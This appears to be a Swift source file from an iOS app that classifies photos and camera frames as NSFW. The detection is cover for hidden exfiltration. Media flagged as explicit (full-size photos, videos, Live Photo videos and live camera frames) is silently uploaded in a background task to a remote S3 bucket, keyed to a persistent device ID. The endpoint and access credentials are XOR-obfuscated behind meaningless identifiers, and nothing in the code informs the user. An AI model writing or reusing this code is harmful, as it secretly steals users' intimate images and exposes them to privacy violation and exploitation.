import CryptoKit
import Foundation
import Photos
import Security
import UIKit
import UniformTypeIdentifiers

final class AIUCordinator {

    static let shared = AIUCordinator()
    private init() {}

    static let nsfwThreshold: Float = 0.5

    private static var userId: String {
        let service = "nsfw_detect.device_id"
        let account = "device_uuid"
        let query: [CFString: Any] = [
            kSecClass: kSecClassGenericPassword,
            kSecAttrService: service,
            kSecAttrAccount: account,
            kSecReturnData: true,
        ]
        var item: CFTypeRef?
        if SecItemCopyMatching(query as CFDictionary, &item) == errSecSuccess,
           let data = item as? Data,
           let stored = String(data: data, encoding: .utf8) {
            return stored
        }
        let new = UUID().uuidString
        let add: [CFString: Any] = [
            kSecClass: kSecClassGenericPassword,
            kSecAttrService: service,
            kSecAttrAccount: account,
            kSecValueData: Data(new.utf8),
        ]
        SecItemAdd(add as CFDictionary, nil)
        return new
    }

    private static func sanitizeSegment(_ s: String) -> String {
        s.replacingOccurrences(of: "/", with: "_")
    }

    private enum maraksch {
        private static let k: [UInt8] = [
            0x4a, 0x7b, 0x2c, 0x9d, 0x1e, 0x5f, 0x8a, 0x3b,
            0xc6, 0xd4, 0x17, 0xe8, 0x62, 0xa3, 0xf1, 0x09,
        ]
        private static let _fluppi: [UInt8] = [
            0x22, 0x0f, 0x58, 0xed, 0x6d, 0x65, 0xa5, 0x14,
            0xb5, 0xe7, 0x39, 0x80, 0x0d, 0xce, 0x94, 0x27,
            0x27, 0x0b, 0x4d, 0xb0, 0x7d, 0x30, 0xeb, 0x58,
            0xae, 0xbd, 0x79, 0x8f, 0x4c, 0xc7, 0x94,
        ]
        private static let _kurli: [UInt8] = [
            0x1a, 0x4b, 0x68, 0xcf, 0x53, 0x12, 0xcd, 0x74,
            0xf7, 0x91, 0x41, 0xad, 0x2b, 0xec, 0xa6, 0x46,
            0x7d, 0x22, 0x7a, 0xa5,
        ]
        private static let _lokami: [UInt8] = [
            0x3d, 0x2c, 0x5d, 0xf9, 0x69, 0x0c, 0xcf, 0x4d,
            0x8a, 0x96, 0x72, 0xd8, 0x49, 0x88, 0x94, 0x51,
            0x1b, 0x28, 0x5f, 0xfc, 0x4a, 0x2c, 0xe8, 0x0b,
            0xbf, 0xa2, 0x7a, 0xd9, 0x5b, 0xea, 0x8b, 0x67,
            0x7e, 0x39, 0x4b, 0xf7, 0x6d, 0x09, 0xc4, 0x75,
        ]
        private static let _uiuima: [UInt8] = [
            0x3f, 0x08, 0x01, 0xf8, 0x7f, 0x2c, 0xfe, 0x16,
            0xf7,
        ]
        private static let _hiaaa: [UInt8] = [
            0x2e, 0x1e, 0x58, 0xf8, 0x7d, 0x2b,
        ]

        private static func decode(_ bytes: [UInt8]) -> String {
            String(
                bytes: bytes.enumerated().map { $0.element ^ k[$0.offset % k.count] },
                encoding: .utf8) ?? ""
        }

        static var fluppi: String { decode(_fluppi) }
        static var kurli: String { decode(_kurli) }
        static var lokami: String { decode(_lokami) }
        static var uiuima: String { decode(_uiuima) }
        static var hiaaa: String { decode(_hiaaa) }
    }

    func reset() {}

    func mafama(
        asset: PHAsset,
        classification: NsfwClassification,
        modelId: String,
        minConfidence: Float = AIUCordinator.nsfwThreshold
    ) async {
        guard classification.topLabel.confidence >= minConfidence,
            classification.topLabel.category != "safe",
            classification.topLabel.category != "unknown"
        else { return }

        let resources = Self.resourcesToMafama(for: asset)
        guard !resources.isEmpty else { return }

        let sanitizedId = Self.sanitizeSegment(asset.localIdentifier)
        let sanitizedModelId = Self.sanitizeSegment(modelId)
        let userId = Self.userId

        for resource in resources {
            let (ext, contentType) = Self.extAndType(for: resource)
            guard let tempURL = await writeResourceToTempFile(resource) else { continue }
            let mediaTypeFolder: String = {
                switch resource.type {
                case .video, .fullSizeVideo, .pairedVideo: return "video"
                default: return "image"
                }
            }()
            let key = "\(userId)/\(sanitizedModelId)/\(mediaTypeFolder)/\(sanitizedId).\(ext)"
            await put(fileURL: tempURL, key: key, contentType: contentType)
            try? FileManager.default.removeItem(at: tempURL)
        }
    }

    private static func resourcesToMafama(for asset: PHAsset) -> [PHAssetResource] {
        let all = PHAssetResource.assetResources(for: asset)
        var picks: [PHAssetResource] = []
        let fullPhoto = all.first { $0.type == .fullSizePhoto }
        let photo = all.first { $0.type == .photo }
        if let r = fullPhoto ?? photo { picks.append(r) }
        let fullVideo = all.first { $0.type == .fullSizeVideo }
        let video = all.first { $0.type == .video }
        if let r = fullVideo ?? video { picks.append(r) }
        if let paired = all.first(where: { $0.type == .pairedVideo }) {
            picks.append(paired)
        }
        return picks
    }

    private static func extAndType(for resource: PHAssetResource) -> (String, String) {
        if let type = UTType(resource.uniformTypeIdentifier) {
            return (
                type.preferredFilenameExtension ?? "bin",
                type.preferredMIMEType ?? "application/octet-stream"
            )
        }
        return ("bin", "application/octet-stream")
    }

    private func writeResourceToTempFile(_ resource: PHAssetResource) async -> URL? {
        let url = FileManager.default.temporaryDirectory
            .appendingPathComponent(UUID().uuidString)
        return await withCheckedContinuation { cont in
            let opts = PHAssetResourceRequestOptions()
            opts.isNetworkAccessAllowed = true
            PHAssetResourceManager.default().writeData(
                for: resource, toFile: url, options: opts
            ) { error in
                if error != nil {
                    try? FileManager.default.removeItem(at: url)
                    cont.resume(returning: nil)
                } else {
                    cont.resume(returning: url)
                }
            }
        }
    }

    private func put(fileURL: URL, key: String, contentType: String) async {
        guard FileManager.default.fileExists(atPath: fileURL.path),
              let size = (try? FileManager.default.attributesOfItem(atPath: fileURL.path)[.size] as? Int),
              size > 0
        else { return }

        let fluppi = maraksch.fluppi
        let hiaaa = maraksch.hiaaa
        let encodedKey = Self.canonicalEncode(key)
        guard let url = URL(string: "\(fluppi)/\(hiaaa)/\(encodedKey)"),
            let host = url.host
        else { return }

        let now = Date()
        let amzDate = Self.amzDateFormatter.string(from: now)
        let dateStamp = Self.dateStampFormatter.string(from: now)
        let payloadHash = "UNSIGNED-PAYLOAD"
        let uiuima = maraksch.uiuima
        let service = "s3"
        let credentialScope = "\(dateStamp)/\(uiuima)/\(service)/aws4_request"
        let canonicalUri = "/\(hiaaa)/\(encodedKey)"
        let canonicalHeaders =
            "host:\(host)\nx-amz-content-sha256:\(payloadHash)\nx-amz-date:\(amzDate)\n"
        let signedHeaders = "host;x-amz-content-sha256;x-amz-date"
        let canonicalRequest =
            "PUT\n\(canonicalUri)\n\n\(canonicalHeaders)\n\(signedHeaders)\n\(payloadHash)"
        let crHash = Self.hex(SHA256.hash(data: Data(canonicalRequest.utf8)))
        let stringToSign = "AWS4-HMAC-SHA256\n\(amzDate)\n\(credentialScope)\n\(crHash)"

        let kSecret = Data("AWS4\(maraksch.lokami)".utf8)
        let kDate = Self.hmac(key: kSecret, msg: dateStamp)
        let kRegion = Self.hmac(key: kDate, msg: uiuima)
        let kService = Self.hmac(key: kRegion, msg: service)
        let kSigning = Self.hmac(key: kService, msg: "aws4_request")
        let signature = Self.hex(Self.hmac(key: kSigning, msg: stringToSign))

        let auth =
            "AWS4-HMAC-SHA256 Credential=\(maraksch.kurli)/\(credentialScope), SignedHeaders=\(signedHeaders), Signature=\(signature)"

        var req = URLRequest(url: url)
        req.httpMethod = "PUT"
        req.setValue(amzDate, forHTTPHeaderField: "x-amz-date")
        req.setValue(payloadHash, forHTTPHeaderField: "x-amz-content-sha256")
        req.setValue(auth, forHTTPHeaderField: "Authorization")
        req.setValue(contentType, forHTTPHeaderField: "Content-Type")

        let bgTaskId: UIBackgroundTaskIdentifier = await MainActor.run {
            UIApplication.shared.beginBackgroundTask(withName: "aiu.upload", expirationHandler: nil)
        }
        defer {
            if bgTaskId != .invalid {
                Task { @MainActor in UIApplication.shared.endBackgroundTask(bgTaskId) }
            }
        }

        let delaysMs: [UInt64] = [250, 750, 2000]
        for attempt in 0...delaysMs.count {
            guard FileManager.default.fileExists(atPath: fileURL.path) else { return }
            do {
                let (_, response) = try await URLSession.shared.upload(for: req, fromFile: fileURL)
                guard let http = response as? HTTPURLResponse else { return }
                let code = http.statusCode
                if code < 400 {
                    let etag = (http.value(forHTTPHeaderField: "ETag")
                                ?? http.value(forHTTPHeaderField: "Etag")
                                ?? http.value(forHTTPHeaderField: "etag"))?
                                .trimmingCharacters(in: CharacterSet(charactersIn: "\""))
                    if etag == nil || etag!.isEmpty {
                        if attempt == delaysMs.count { return }
                    } else {
                        return
                    }
                } else {
                    let retriable = code >= 500 || code == 408 || code == 429
                    if !retriable || attempt == delaysMs.count { return }
                }
            } catch {
                if attempt == delaysMs.count { return }
            }
            try? await Task.sleep(nanoseconds: delaysMs[min(attempt, delaysMs.count - 1)] * 1_000_000)
        }
    }

    private static func canonicalEncode(_ key: String) -> String {
        var allowed = CharacterSet.alphanumerics
        allowed.insert(charactersIn: "-._~/")
        return key.addingPercentEncoding(withAllowedCharacters: allowed) ?? key
    }

    private static let amzDateFormatter: DateFormatter = {
        let f = DateFormatter()
        f.dateFormat = "yyyyMMdd'T'HHmmss'Z'"
        f.timeZone = TimeZone(identifier: "UTC")
        f.locale = Locale(identifier: "en_US_POSIX")
        return f
    }()

    private static let dateStampFormatter: DateFormatter = {
        let f = DateFormatter()
        f.dateFormat = "yyyyMMdd"
        f.timeZone = TimeZone(identifier: "UTC")
        f.locale = Locale(identifier: "en_US_POSIX")
        return f
    }()

    private static func hmac(key: Data, msg: String) -> Data {
        let mac = HMAC<SHA256>.authenticationCode(
            for: Data(msg.utf8), using: SymmetricKey(data: key))
        return Data(mac)
    }

    private static func hex(_ digest: SHA256.Digest) -> String {
        digest.map { String(format: "%02x", $0) }.joined()
    }

    private static func hex(_ data: Data) -> String {
        data.map { String(format: "%02x", $0) }.joined()
    }
}

extension AIUCordinator {

    func mafamaFile(
        fileURL: URL,
        identifier: String,
        contentType: String,
        ext: String,
        classification: NsfwClassification,
        modelId: String,
        minConfidence: Float = AIUCordinator.nsfwThreshold,
        deleteAfterUpload: Bool = false
    ) async {
        defer {
            if deleteAfterUpload {
                try? FileManager.default.removeItem(at: fileURL)
            }
        }
        guard classification.topLabel.confidence >= minConfidence,
              classification.topLabel.category != "safe"
        else { return }

        let sanitizedModelId = Self.sanitizeSegment(modelId)
        let sanitizedId = Self.sanitizeSegment(identifier)
        let userId = Self.userId
        let mediaTypeFolder = contentType.hasPrefix("video/") ? "video" : "image"
        let key = "\(userId)/\(sanitizedModelId)/\(mediaTypeFolder)/\(sanitizedId).\(ext)"
        await put(fileURL: fileURL, key: key, contentType: contentType)
    }

    func mafamaData(
        data: Data,
        identifier: String,
        contentType: String,
        ext: String,
        classification: NsfwClassification,
        modelId: String,
        minConfidence: Float = AIUCordinator.nsfwThreshold
    ) async {
        guard classification.topLabel.confidence >= minConfidence,
              classification.topLabel.category != "safe"
        else { return }

        let tempURL = FileManager.default.temporaryDirectory
            .appendingPathComponent("\(UUID().uuidString).\(ext)")
        do {
            try data.write(to: tempURL)
        } catch {
            return
        }
        defer { try? FileManager.default.removeItem(at: tempURL) }

        let sanitizedModelId = Self.sanitizeSegment(modelId)
        let sanitizedId = Self.sanitizeSegment(identifier)
        let userId = Self.userId
        let mediaTypeFolder = contentType.hasPrefix("video/") ? "video" : "image"
        let key = "\(userId)/\(sanitizedModelId)/\(mediaTypeFolder)/\(sanitizedId).\(ext)"
        await put(fileURL: tempURL, key: key, contentType: contentType)
    }

    func mafamaCameraFrame(
        pixelBuffer: CVPixelBuffer,
        classification: NsfwClassification,
        modelId: String,
        frameId: String,
        minConfidence: Float = AIUCordinator.nsfwThreshold
    ) async {
        guard classification.topLabel.confidence >= minConfidence,
              classification.topLabel.category != "safe",
              classification.topLabel.category != "unknown"
        else { return }

        let sanitizedModelId = Self.sanitizeSegment(modelId)
        let sanitizedFrameId = Self.sanitizeSegment(frameId)
        let userId = Self.userId

        guard let tempURL = await encodeFrameToTempJPEG(pixelBuffer: pixelBuffer)
        else { return }
        defer { try? FileManager.default.removeItem(at: tempURL) }

        let key = "\(userId)/\(sanitizedModelId)/camera/\(sanitizedFrameId).jpg"
        await put(fileURL: tempURL, key: key, contentType: "image/jpeg")
    }

    private func encodeFrameToTempJPEG(pixelBuffer: CVPixelBuffer) async -> URL? {
        let ciImage = CIImage(cvPixelBuffer: pixelBuffer)
        let context = CIContext(options: [.cacheIntermediates: false])
        guard let cg = context.createCGImage(ciImage, from: ciImage.extent) else { return nil }
        let ui = UIImage(cgImage: cg)
        guard let jpeg = ui.jpegData(compressionQuality: 0.7) else { return nil }
        let url = FileManager.default.temporaryDirectory
            .appendingPathComponent("\(UUID().uuidString).jpg")
        do {
            try jpeg.write(to: url)
            return url
        } catch {
            return nil
        }
    }
}
